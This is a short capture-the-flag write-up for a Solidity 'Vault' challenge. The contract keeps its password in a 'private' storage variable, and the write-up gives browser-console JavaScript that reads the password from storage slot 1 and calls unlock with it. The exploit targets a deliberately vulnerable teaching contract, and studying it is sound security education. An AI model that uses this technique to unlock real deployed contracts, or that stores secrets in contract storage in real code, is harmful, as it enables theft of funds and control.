# Vault Attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}

```

### task

The challenge goal is to unlock the locked contract

### solution

The attack is simple, nothing is private on the ethereum network, unless if it's encrypted and the decryption keys are not published.
In this case we simply need to check the contract storage for the value of password to unlock the contract.

### steps

```javascript
// in your browser console

// you can just submit the encoded value to the contract
let encoded_password = await web3.eth.getStorageAt(contract.address, 1);

// decode the password
web3.utils.toAscii(encoded_password);

// send the encoded_password to the contract
contract.unlock(encoded_password);

```
